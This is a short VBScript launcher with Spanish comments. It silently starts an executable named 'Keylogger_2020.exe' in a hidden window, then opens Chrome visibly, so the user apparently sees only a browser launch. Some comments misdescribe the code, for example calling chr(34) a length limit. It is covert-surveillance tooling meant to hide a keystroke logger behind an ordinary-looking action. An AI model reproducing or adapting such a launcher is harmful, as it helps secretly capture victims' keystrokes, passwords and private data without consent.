Set WshShell = CreateObject("WScript.Shell")					'Creamos objeto ... Para que podamos manejar nuestro Shell

WshShell.Run chr(34) & "C:\Users\Marco_Jhoel\Documents\Setups\dist\Keylogger_2020.exe" & chr(34), 0		'Ejecutamos el programa con menos de 34 caracteres

WshShell.Run chr(34) & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"  & chr(34), 1		'Ejecutamos el programa con menos de 34 caracteres

Set WshShell = Nothing											'Para que nuestra Shell no muestre nada
